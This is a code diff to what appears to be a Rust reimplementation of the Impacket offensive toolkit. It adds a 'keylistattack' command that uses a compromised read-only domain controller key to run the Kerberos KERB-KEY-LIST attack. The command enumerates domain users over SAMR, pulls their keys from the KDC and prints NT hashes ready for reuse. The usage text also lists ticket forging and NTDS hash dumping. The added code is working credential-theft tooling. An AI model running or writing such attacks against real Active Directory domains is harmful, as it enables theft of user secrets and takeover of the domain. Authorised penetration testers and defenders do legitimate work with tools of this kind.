@@ -162,6 +162,7 @@ fn print_usage() {
     println!("  ntdsdump <SYSTEM_FILE> <NTDS_FILE>                   Offline Active Directory domain NT/LM hashes dumper");
     println!("  esentutl <DATABASE_FILE> [tables|table <NAME>]        Extensible Storage Engine (ESE) offline database inspector");
     println!("  dpapi <masterkey|blob> <FILE> [-key <HEX>]           Windows DPAPI MasterKey & Blob offline decryptor");
+    println!("  keylistattack [TARGET] -rodcNo <NO> -rodcKey <HEX>   Dump domain user secrets via MS-KILE KERB-KEY-LIST attack (RODC)");
     println!("  ticketConverter <INPUT> <OUTPUT> [-b]                Convert between .kirbi (Mimikatz) and .ccache (MIT)");
     println!("  ticketer -domain-sid <SID> -domain <D> [options]     Forge Kerberos Golden and Silver Tickets (.ccache / .kirbi)");
     println!("  describeTicket <TICKET_FILE>                         Inspect Kerberos .ccache or .kirbi ticket structures");
@@ -9640,6 +9641,305 @@ fn cmd_badsuccessor(args: &[String]) {
     client.unbind().ok();
 }
 
+fn cmd_keylistattack(args: &[String]) {
+    use impacket_core::decode_hex;
+    use impacket_krb5::keylist::{dump_user_keylist_live, find_nthash};
+    use impacket_msrpc::samr::SamrClient;
+    use std::time::Duration;
+
+    print!("{}", version::BANNER);
+    if args.is_empty() {
+        println!("usage: impacket-rs keylistattack [target] -rodcNo <NO> -rodcKey <KEY> [options]");
+        println!();
+        println!("Performs the KERB-KEY-LIST-REQ attack (MS-KILE) to dump domain user secrets");
+        println!("using a compromised Read-Only Domain Controller (RODC) account key.");
+        println!();
+        println!("positional arguments:");
+        println!("  target                [[domain/]username[:password]@]<targetName or address>");
+        println!();
+        println!("options:");
+        println!("  -rodcNo <NO>          RODC account number (e.g. 20000, required)");
+        println!("  -rodcKey <KEY>        RODC krbtgt AES256/AES128 key in hex (required)");
+        println!("  -rodc-etype <ETYPE>   RODC key encryption type (18=AES256, 17=AES128, 23=RC4)");
+        println!("  -t, -target <USER>    Specific target username or username:rid (e.g. victim:1103)");
+        println!("  -tf <FILE>            File with target usernames to attack (one per line)");
+        println!("  -domain <DOMAIN>      Active Directory domain name");
+        println!("  -domain-sid <SID>     Domain SID (e.g. S-1-5-21-...)");
+        println!("  -kdc <HOST>           KDC hostname or IP (default: target host)");
+        println!("  -dc-ip <IP>           IP address of domain controller");
+        println!("  -full                 Output all dumped encryption keys in addition to NT hash");
+        std::process::exit(1);
+    }
+
+    let mut rodc_no: Option<u32> = None;
+    let mut rodc_key_hex: Option<String> = None;
+    let mut rodc_etype: Option<i32> = None;
+    let mut target_user: Option<String> = None;
+    let mut target_file: Option<String> = None;
+    let mut explicit_domain: Option<String> = None;
+    let mut explicit_domain_sid: Option<String> = None;
+    let mut explicit_kdc: Option<String> = None;
+    let mut full_output = false;
+    let mut non_flag_args = Vec::new();
+
+    let mut i = 0;
+    while i < args.len() {
+        match args[i].as_str() {
+            "-rodcNo" | "-rodc-no" | "-rodcno" if i + 1 < args.len() => {
+                rodc_no = args[i + 1].parse().ok();
+                i += 2;
+            }
+            "-rodcKey" | "-rodc-key" | "-rodckey" if i + 1 < args.len() => {
+                rodc_key_hex = Some(args[i + 1].clone());
+                i += 2;
+            }
+            "-rodc-etype" | "-etype" if i + 1 < args.len() => {
+                rodc_etype = args[i + 1].parse().ok();
+                i += 2;
+            }
+            "-t" | "-target" | "-target-user" if i + 1 < args.len() => {
+                target_user = Some(args[i + 1].clone());
+                i += 2;
+            }
+            "-tf" | "-target-file" if i + 1 < args.len() => {
+                target_file = Some(args[i + 1].clone());
+                i += 2;
+            }
+            "-domain" | "-d" if i + 1 < args.len() => {
+                explicit_domain = Some(args[i + 1].clone());
+                i += 2;
+            }
+            "-domain-sid" | "-sid" if i + 1 < args.len() => {
+                explicit_domain_sid = Some(args[i + 1].clone());
+                i += 2;
+            }
+            "-kdc" | "-dc-ip" if i + 1 < args.len() => {
+                explicit_kdc = Some(args[i + 1].clone());
+                i += 2;
+            }
+            "-full" => {
+                full_output = true;
+                i += 1;
+            }
+            _ => {
+                if !args[i].starts_with('-') {
+                    non_flag_args.push(args[i].clone());
+                }
+                i += 1;
+            }
+        }
+    }
+
+    let rodc_no = match rodc_no {
+        Some(no) => no,
+        None => {
+            eprintln!("[-] Missing required argument -rodcNo <NO>");
+            std::process::exit(1);
+        }
+    };
+
+    let rodc_key_raw = match rodc_key_hex {
+        Some(k) => k,
+        None => {
+            eprintln!("[-] Missing required argument -rodcKey <KEY_HEX>");
+            std::process::exit(1);
+        }
+    };
+
+    let rodc_key = match decode_hex(rodc_key_raw.trim_start_matches("0x")) {
+        Ok(k) => k,
+        Err(e) => {
+            eprintln!("[-] Invalid hex in -rodcKey: {}", e);
+            std::process::exit(1);
+        }
+    };
+
+    let etype = rodc_etype.unwrap_or_else(|| {
+        if rodc_key.len() == 32 {
+            18
+        } else if rodc_key.len() == 16 {
+            17
+        } else {
+            18
+        }
+    });
+
+    // Resolve target spec if provided
+    let spec_opt = if !non_flag_args.is_empty() {
+        parse_target_with_hashes(&non_flag_args).ok()
+    } else {
+        None
+    };
+
+    let domain = explicit_domain
+        .or_else(|| {
+            spec_opt
+                .as_ref()
+                .map(|s| s.domain.clone())
+                .filter(|d| !d.is_empty())
+        })
+        .unwrap_or_default();
+
+    if domain.is_empty() {
+        eprintln!("[-] Domain is required. Specify target domain (e.g. contoso.com/user@dc) or -domain <DOMAIN>");
+        std::process::exit(1);
+    }
+
+    let kdc_host = explicit_kdc
+        .or_else(|| spec_opt.as_ref().map(|s| s.effective_target_ip().to_string()))
+        .unwrap_or_else(|| domain.clone());
+
+    let mut targets: Vec<(String, Option<u32>)> = Vec::new();
+    let mut domain_sid = explicit_domain_sid;
+
+    if let Some(user_arg) = target_user {
+        if let Some((user, rid_str)) = user_arg.split_once(':') {
+            targets.push((user.to_string(), rid_str.parse().ok()));
+        } else {
+            targets.push((user_arg, None));
+        }
+    } else if let Some(file_path) = target_file {
+        match std::fs::read_to_string(&file_path) {
+            Ok(content) => {
+                for line in content.lines() {
+                    let line = line.trim();
+                    if line.is_empty() || line.starts_with('#') {
+                        continue;
+                    }
+                    if let Some((user, rid_str)) = line.split_once(':') {
+                        targets.push((user.to_string(), rid_str.parse().ok()));
+                    } else {
+                        targets.push((line.to_string(), None));
+                    }
+                }
+            }
+            Err(e) => {
+                eprintln!("[-] Failed reading target file '{}': {}", file_path, e);
+                std::process::exit(1);
+            }
+        }
+    } else if let Some(ref spec) = spec_opt {
+        // Enumerate users via SAMR on DC
+        println!("[*] Connecting to SAMR on {} to enumerate allowed replication targets...", spec.effective_target_ip());
+        let samr_enum_res = (|| -> Result<Vec<(String, Option<u32>)>, CoreError> {
+            let transport = open_pipe_transport(spec, "samr", IFACE_SAMR)?;
+            let mut client = SamrClient::new(transport);
+            let server_name = format!(r"\\{}", spec.effective_target_ip());
+            let server_handle = client.connect5(&server_name, 0x0000_0230)?;
+
+            let (_, dom_sid) = if let Some(ref d_sid_str) = domain_sid {
+                let parsed_sid = impacket_ndr::RpcSid::parse(d_sid_str)?;
+                (domain.clone(), parsed_sid)
+            } else {
+                let sid = client.lookup_domain(&server_handle, &domain)?;
+                (domain.clone(), sid)
+            };
+
+            domain_sid = Some(dom_sid.to_string());
+            let domain_handle = client.open_domain(&server_handle, 0x0000_0300, &dom_sid)?;
+
+            // RID 572: Denied RODC Password Replication Group
+            let mut denied_rids = vec![500, 501, 502, 503];
+            if let Ok(alias_h) = client.open_alias(&domain_handle, 0x0002_0004, 572) {
+                if let Ok(members) = client.get_members_in_alias(&alias_h) {
+                    for sid in members {
+                        if let Some(&last_sub) = sid.sub_authorities.last() {
+                            if !denied_rids.contains(&last_sub) {
+                                denied_rids.push(last_sub);
+                            }
+                        }
+                    }
+                }
+                client.close_handle(&alias_h).ok();
+            }
+
+            let all_users = client.enumerate_users(&domain_handle, 0)?;
+            let mut allowed = Vec::new();
+            for u in all_users {
+                if !denied_rids.contains(&u.relative_id) && !u.name.starts_with("krbtgt_") {
+                    allowed.push((u.name, Some(u.relative_id)));
+                }
+            }
+            Ok(allowed)
+        })();
+
+        match samr_enum_res {
+            Ok(found) => {
+                println!("[*] Found {} domain user(s) allowed for RODC replication.", found.len());
+                targets = found;
+            }
+            Err(e) => {
+                eprintln!("[-] SAMR user enumeration failed: {}. Specify targets manually with -t or -tf", e);
+                std::process::exit(1);
+            }
+        }
+    } else {
+        eprintln!("[-] No target users specified. Provide target credentials for SAMR enum, or specify -t <USER> / -tf <FILE>");
+        std::process::exit(1);
+    }
+
+    if targets.is_empty() {
+        println!("[-] No users to attack.");
+        return;
+    }
+
+    println!("[*] Executing KERB-KEY-LIST attack against KDC {} for {} target(s)...", kdc_host, targets.len());
+
+    let now_unix = std::time::SystemTime::now()
+        .duration_since(std::time::UNIX_EPOCH)
+        .unwrap()
+        .as_secs() as i64;
+
+    for (user, rid_opt) in &targets {
+        let res = dump_user_keylist_live(
+            &kdc_host,
+            88,
+            &domain,
+            user,
+            *rid_opt,
+            domain_sid.as_deref(),
+            rodc_no,
+            &rodc_key,
+            etype,
+            &[23, 18, 17],
+            now_unix,
+            Duration::from_secs(10),
+        );
+
+        match res {
+            Ok(keys) => {
+                let rid_str = rid_opt.map(|r| r.to_string()).unwrap_or_else(|| "1000".into());
+                if let Some(nthash) = find_nthash(&keys) {
+                    println!(
+                        "{}\\{}:{}:aad3b435b51404eeaad3b435b51404ee:{}:::",
+                        domain.to_uppercase(),
+                        user,
+                        rid_str,
+                        nthash
+                    );
+                } else {
+                    println!("[+] {}\\{} (RID {}): dumped {} keys", domain.to_uppercase(), user, rid_str, keys.len());
+                }
+                if full_output {
+                    for (ktype, kval) in &keys {
+                        println!("    etype {:<3} : {}", ktype, impacket_core::encode_hex(kval));
+                    }
+                }
+            }
+            Err(e) => {
+                let err_str = e.to_string();
+                if err_str.contains("0x12") || err_str.contains("KDC_ERR_CLIENT_REVOKED") || err_str.contains("KDC_ERR_TGT_REVOKED") {
+                    eprintln!("[-] User {} is not allowed to have passwords replicated to RODCs", user);
+                } else if err_str.contains("0x6") || err_str.contains("KDC_ERR_C_PRINCIPAL_UNKNOWN") {
+                    eprintln!("[-] User {} doesn't exist", user);
+                } else {
+                    eprintln!("[-] {}\\{}: {}", domain, user, e);
+                }
+            }
+        }
+    }
+}
+
 fn cmd_dacledit(args: &[String]) {
     use impacket_ldap::dacledit::{grant_right, read_dacl, revoke_rights, DaclRight};
     use impacket_ldap::LdapClient;
@@ -14103,6 +14403,9 @@ fn main() {
         Some("rpc-interfaces") => cmd_rpc_interfaces(),
         Some("bench-ndr") => cmd_bench_ndr(&args[1..]),
         Some("completions") | Some("completion") => cmd_completions(&args[1..]),
+        Some("keylistattack") | Some("keylistdump") | Some("keylist") => {
+            cmd_keylistattack(&args[1..])
+        }
         _ => print_usage(),
     }
 }
